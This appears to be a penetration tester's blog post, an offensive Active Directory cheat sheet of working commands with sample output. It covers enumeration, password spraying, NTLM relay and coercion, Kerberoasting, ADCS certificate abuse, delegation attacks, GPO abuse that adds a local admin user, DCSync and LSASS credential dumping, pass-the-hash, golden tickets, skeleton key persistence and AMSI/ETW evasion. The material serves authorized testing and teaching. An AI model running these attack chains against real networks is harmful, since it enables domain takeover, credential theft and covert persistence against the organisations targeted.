---
title: "Active Directory — Offensive Cheat Sheet"
date: 2026-11-03 10:00:00 +0400
last_modified_at: 2026-11-03 10:00:00 +0400
categories: [AD]
tags: [active-directory, kerberos, ntlm, bloodhound, adcs, mimikatz, impacket, lateral-movement, persistence]
pin: true
toc: true
---

{% include term-boot.html %}

A living reference I keep for engagements. Every command assumes a Kali
attacker box and a Windows AD target. Replace `DC01.lab.local`,
`lab.local`, `10.10.10.10`, usernames, hashes and SIDs with values from
your own target.

> Every technique here is for authorized engagements only. Know your
> scope, keep clean logs, and clean up tickets, machine accounts and
> GPO edits before you leave.
{: .prompt-warning }

## 0. Attacker environment

```bash
# Impacket in a venv (keeps it current, avoids distro lag)
python3 -m venv ~/.venv/impacket && source ~/.venv/impacket/bin/activate
pip install impacket certipy-ad bloodhound ldap3 pyasn1 dnspython

# Core tools
sudo apt install -y crackmapexec enum4linux-ng evil-winrm responder \
                    smbmap kerbrute hashcat john bloodhound neo4j \
                    netexec seclists
```

## 1. Recon & discovery

### Find the DCs

```terminal
# prompt: m
# cwd: ~/engagement
$ nmap -p 88,389,445,636,3268 10.10.10.0/24 --open -oG dc-sweep.gnmap
---
Starting Nmap 7.94 at 2026-11-03 09:22 +04
Nmap scan report for 10.10.10.10
Host is up (0.042s latency).
PORT     STATE SERVICE
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
636/tcp  open  ldaps
3268/tcp open  globalcat-ldap

Nmap scan report for 10.10.10.11
Host is up (0.038s latency).
PORT     STATE SERVICE
445/tcp  open  microsoft-ds

Nmap done: 254 IP addresses (2 hosts up) scanned in 12.84s
```

Port signatures:

| Ports open | Role |
|---|---|
| 88, 389, 445, 636, 3268 | Domain Controller |
| 445, 139, no 88 | Member server / workstation |
| 1433 | MSSQL (often linked to AD) |
| 389 open, 636 closed | LDAPS not enforced — relay candidate |
| 445 with signing not required | SMB relay candidate |

## 2. Unauthenticated enumeration

### SMB — null sessions

```bash
smbclient -L //10.10.10.10 -N -U ''
smbmap -H 10.10.10.10 -u '' -p ''
nxc smb 10.10.10.10 -u '' -p '' --shares
enum4linux-ng -A -u '' -p '' 10.10.10.10
nxc smb 10.10.10.10 -u '' -p '' --users --groups --pass-pol
```

### Kerbrute — username enumeration (no 4625 events)

```terminal
# prompt: m
# cwd: ~/htb/lab
$ kerbrute userenum --dc 10.10.10.10 -d lab.local users.txt
---
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1)
2026/11/03 09:40:12 >  [+] VALID USERNAME:  svc_sql@lab.local
2026/11/03 09:40:12 >  [+] VALID USERNAME:  administrator@lab.local
2026/11/03 09:40:13 >  [+] VALID USERNAME:  m.gold@lab.local
2026/11/03 09:40:13 >  [+] VALID USERNAME:  c.bum@lab.local
2026/11/03 09:40:14 >  Done! Tested 14600 usernames (4 valid) in 2.034 seconds
```

### Password policy & relay list

```bash
nxc smb 10.10.10.10 -u guest -p '' --pass-pol
nxc smb 10.10.10.0/24 --gen-relay-list relay-targets.txt
# Hosts in the file have signing not required → relayable.
```

## 3. Credentialed enumeration

### BloodHound collection

```bash
# Linux-side with bloodhound.py
bloodhound-python -u user -p 'Pass123' -d lab.local -ns 10.10.10.10 -c All --zip

# Windows-side with SharpHound
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename sh.zip
```

Pre-built queries worth running first:

- Shortest paths to Domain Admins
- Shortest paths from owned (right-click → Mark as Owned on every user you have)
- Kerberoastable Users / AS-REP Roastable Users
- Users with DCSync privileges
- Dangerous ACL edges — `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`

### PowerView (on a Windows foothold)

```powershell
. .\PowerView.ps1
Get-NetUser -SPN                            # kerberoastable users
Get-NetUser -PreauthNotRequired             # AS-REP roastable
Get-NetGroupMember "Domain Admins"
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq 'MyUser'}
Get-DomainTrust
```

### ADCS enumeration

```bash
certipy find -u user@lab.local -p 'Pass123' -dc-ip 10.10.10.10 -vulnerable -stdout
.\Certify.exe find /vulnerable
```

Look for templates where **ENROLLEE_SUPPLIES_SUBJECT**, **Client Authentication** EKU, and low-privileged enrollment rights coincide (ESC1).

## 4. Password attacks

### Password spray

```bash
nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success | grep '\[+\]'
kerbrute passwordspray --dc 10.10.10.10 -d lab.local users.txt 'Autumn2026!'
```

Seasonal/lazy passwords worth trying first: `<Company>123`, `Welcome1`, `Password1`, `Summer2026!`, `<Month><Year>!`, `Changeme123`, `P@ssw0rd`.

### LLMNR / NBT-NS / mDNS poisoning

```bash
sudo responder -I eth0 -wd
hashcat -m 5600 ntlmv2-hashes.txt rockyou.txt
```

### NTLM relay

```bash
sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support -of loot
sudo impacket-ntlmrelayx -t ldaps://10.10.10.10 --delegate-access --escalate-user attacker
sudo impacket-ntlmrelayx -t mssql://10.10.10.20 -q 'EXEC xp_cmdshell "whoami"'
```

### Coerce authentication

```bash
python3 PetitPotam.py -u user -p pass -d lab.local 10.10.14.5 10.10.10.10
python3 printerbug.py lab.local/user:pass@10.10.10.10 10.10.14.5
python3 dfscoerce.py -u user -p pass -d lab.local 10.10.14.5 10.10.10.10
```

## 5. Kerberos attacks

### Kerberoasting

```terminal
# prompt: m
# cwd: ~/htb/active
$ impacket-GetUserSPNs -request -dc-ip 10.10.10.10 lab.local/user:'Pass123' -outputfile krb-tgs.txt
---
Impacket v0.12.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=lab,DC=local   2018-07-18 15:06:40.351723

[*] Writing output to krb-tgs.txt
$ hashcat -m 13100 krb-tgs.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting...
...
$krb5tgs$23$*Administrator$LAB.LOCAL$...9d7c:Ticketmaster1968
Session..........: hashcat
Status...........: Cracked
```

### AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -format hashcat lab.local/ -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

### Overpass-the-Hash (NT hash → Kerberos ticket)

```bash
impacket-getTGT lab.local/user -hashes :e19ccf75ee54e06b06a5907af13cef42
export KRB5CCNAME=user.ccache
impacket-wmiexec -k -no-pass lab.local/user@dc01.lab.local
```

### Timeroasting (newer)

```bash
python3 timeroast.py 10.10.10.10 -o timeroast.hash
hashcat -m 31300 timeroast.hash rockyou.txt
```

## 6. ACL abuse

### GenericAll / GenericWrite / WriteDacl on a user

```bash
# Shadow Credentials — clean, silent, no password change
certipy shadow auto -u attacker@lab.local -p 'Pass' -account victim

# Or force-reset their password (loud — breaks the account)
net rpc password 'victim' 'NewP@ss1' -U 'lab.local/attacker%Pass' -S dc01
```

### GenericAll on a group

```bash
bloodyAD -u attacker -p 'Pass' -d lab.local --host dc01 add groupMember 'Domain Admins' attacker
```

### WriteOwner

```bash
impacket-owneredit -action write -new-owner attacker -target victim -k -no-pass
impacket-dacledit -action write -rights FullControl -principal attacker -target victim
```

### ForceChangePassword

```bash
rpcclient -U 'attacker%Pass' dc01 -c "setuserinfo2 victim 23 'NewP@ss1'"
```

## 7. ADCS exploitation

Certipy is the primary tool. Highlights:

### ESC1 — client supplies subject + client-auth EKU

```terminal
# prompt: m
# cwd: ~/htb/certified
$ certipy req -u attacker@lab.local -p 'Pass' -ca LAB-CA -template VulnTemplate -upn administrator@lab.local -dc-ip 10.10.10.10
---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 42
[*] Got certificate with UPN 'administrator@lab.local'
[*] Certificate object SID is None
[*] Saved certificate and private key to 'administrator.pfx'
$ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[+] Got hash for 'administrator@lab.local': aad3b435...:7facdc498ed1680c4fd1448319a8c04f
```

### ESC2 / ESC3 / ESC4 / ESC6 / ESC7 / ESC8

- **ESC2** — Any Purpose EKU: same flow as ESC1
- **ESC3** — enrollment agent → enroll on behalf of any user
- **ESC4** — vulnerable template ACL → overwrite template config, exploit as ESC1
- **ESC6** — `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA → set UPN at request time
- **ESC7** — CA ACL abuse (ManageCA) → add officer, enable SubCA template
- **ESC8** — HTTP(S) web enrollment + NTLM relay (coerce DC\$ → `/certsrv`)

Full example of ESC8:

```bash
sudo impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp --adcs --template DomainController
# Feed with coerce (PetitPotam / PrinterBug / DFSCoerce)
```

ESC9–ESC15 exist too; `certipy find -vulnerable` tags them all.

## 8. Delegation attacks

### Unconstrained delegation

```powershell
Rubeus.exe monitor /interval:5 /nowrap
# Trigger: coerce the DC to auth to this host (PetitPotam / PrinterBug)
# Then import the captured DC$ TGT and DCSync.
```

### Constrained delegation (S4U2Proxy)

```bash
impacket-getST -spn cifs/dc01.lab.local -impersonate administrator lab.local/service$:'Pass'
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass dc01.lab.local
```

### Resource-Based Constrained Delegation (RBCD)

```bash
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'Pass123' -dc-ip 10.10.10.10 lab.local/attacker:'Pass'
impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'VICTIM$' -action write lab.local/attacker:'Pass'
impacket-getST -spn cifs/victim.lab.local -impersonate administrator lab.local/FAKE\$:'Pass123'
```

## 9. GPO abuse

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Workstations Policy"

.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Patch" \
    --Author LAB\admin --Command "cmd.exe" \
    --Arguments "/c net user attacker Pass123! /add && net localgroup Administrators attacker /add" \
    --GPOName "Workstations Policy"
```

## 10. Credential access

### DCSync

```terminal
# prompt: m
# cwd: ~/htb/dc
$ impacket-secretsdump -just-dc-user lab.local/krbtgt lab.local/dasync:'Pass'@10.10.10.10
---
Impacket v0.12.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b3ec3e03e2a202cbd54fd104bc59c20a:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:4a8a74daad837ae555c7bd...
krbtgt:aes128-cts-hmac-sha1-96:36b1a3bd43cafa05...
krbtgt:des-cbc-md5:7e689c3f85f0e7fa
[*] Cleaning up...
```

### Dump LSASS (local admin on a target)

```powershell
# Native — comsvcs.dll
tasklist /svc | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\l.dmp full

# Mimikatz (AV-flagged)
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
```

```bash
# Parse offline
pypykatz lsa minidump l.dmp
```

### NTDS.dit (on a DC)

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\
reg save hklm\system C:\Windows\Temp\system
```

```bash
impacket-secretsdump -ntds NTDS.dit -system system LOCAL
```

### DPAPI

```powershell
dpapi::masterkey /in:"C:\Users\u\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /sid:S-1-5-21-… /password:plaintext
dpapi::cred /in:"C:\Users\u\AppData\Local\Microsoft\Credentials\<file>" /masterkey:<key>
```

## 11. Lateral movement

### Pass-the-Hash

```bash
impacket-psexec   lab.local/admin@10.10.10.20 -hashes :e19ccf75ee54e06b06a5907af13cef42
impacket-wmiexec  lab.local/admin@10.10.10.20 -hashes :e19ccf75ee54e06b06a5907af13cef42
impacket-smbexec  lab.local/admin@10.10.10.20 -hashes :e19ccf75ee54e06b06a5907af13cef42
nxc smb           10.10.10.20 -u admin -H e19ccf75ee54e06b06a5907af13cef42 -x whoami
```

Which to use when:

| Tool | Writes to disk? | Service created? | Auth protocol | Notes |
|---|---|---|---|---|
| `psexec.py` | yes (uploads .exe) | yes | SMB | Loudest, Defender-noticed |
| `smbexec.py` | no | yes | SMB | Service name randomized |
| `wmiexec.py` | no | no | DCOM/WMI | Semi-interactive, no new service |
| `atexec.py` | no | no (task) | SMB | Scheduled task |
| `evil-winrm` | no | no | WinRM (5985/5986) | Full PowerShell, needs port open |
| `dcomexec.py` | no | no | DCOM | Less logged than WMI |

### Pass-the-Ticket & Evil-WinRM

```bash
impacket-ticketConverter admin.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
impacket-wmiexec -k -no-pass dc01.lab.local

evil-winrm -i 10.10.10.20 -u admin -H e19ccf75ee54e06b06a5907af13cef42
```

## 12. Persistence

### Golden Ticket

```
kerberos::golden /user:anyone /domain:lab.local /sid:S-1-5-21-… \
    /krbtgt:<krbtgt NT hash> /ptt /id:500
```

Lasts until `krbtgt` is rotated **twice**.

### Silver Ticket

```
kerberos::golden /user:administrator /domain:lab.local /sid:S-1-5-21-… \
    /target:fileserver.lab.local /service:cifs \
    /rc4:<service account NT hash> /ptt
```

### Diamond / Sapphire tickets

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 \
    /groups:512 /krbkey:<krbtgt AES256> /enctype:aes256 /ptt
```

### DSRM backdoor / Skeleton Key / AdminSDHolder

```
lsadump::sam                 # on a DC, read DSRM admin hash
misc::dsrm                   # enable DSRM login over network
misc::skeleton               # universal password "mimikatz" until reboot
```

AdminSDHolder: add attacker to the ACL of `CN=AdminSDHolder,CN=System,DC=lab,DC=local` — SDProp (runs every 60 min) re-applies it to every protected group's members.

## 13. Defense evasion (notes)

- **AMSI** — in-process patching of `AmsiScanBuffer` or `amsiInitFailed`
- **ETW** — patch `EtwEventWrite` in the current process
- **PowerShell logging** — GPO-driven; prefer unmanaged runspaces or move off PowerShell
- **LOLBAS** — [lolbas-project.github.io](https://lolbas-project.github.io)
- **Credential Guard / RunAsPPL** — dump via vulnerable driver, or skip LSASS → DPAPI / ticket cache / DCSync

A good operator avoids triggering a bypass they don't need. Enumerate first; if a path doesn't cross a protection, don't fire the loud tool.

## 14. Tooling index

| Job | Tool |
|---|---|
| Everything SMB/LDAP/MSSQL/WinRM | **NetExec** (nxc, successor to CrackMapExec) |
| psexec, wmiexec, secretsdump, GetUserSPNs, ntlmrelayx | **impacket** |
| AD graph & path finding | **BloodHound CE** + **SharpHound** / **bloodhound.py** |
| ADCS | **Certipy** (Linux), **Certify** (Windows) |
| Kerberos ticket ops | **Rubeus** |
| Credential dumping | **Mimikatz**, **pypykatz**, **lsassy** |
| ACL abuse from Linux | **bloodyAD**, **impacket-dacledit/owneredit** |
| Username enum, password spray | **Kerbrute** |
| LLMNR / NBT-NS poisoning | **Responder**, **Inveigh** |
| GPO abuse | **SharpGPOAbuse** |
| Coerce authentication | **PetitPotam**, **printerbug.py**, **dfscoerce.py**, **Coercer** |
| Lateral shell via WinRM | **evil-winrm** |
| Hash cracking | **hashcat** (GPU), **john** (CPU) |

## Appendix — Hashcat modes

| Mode | Hash |
|---|---|
| 1000 | NTLM |
| 3000 | LM |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS-REP (Kerberoast, RC4) |
| 19700 | Kerberos TGS-REP (AES256) |
| 18200 | Kerberos AS-REP (AS-REP Roast) |
| 31300 | MS-SNTP (Timeroast) |
| 7500 | Kerberos AS-REQ Pre-Auth (etype 23) |
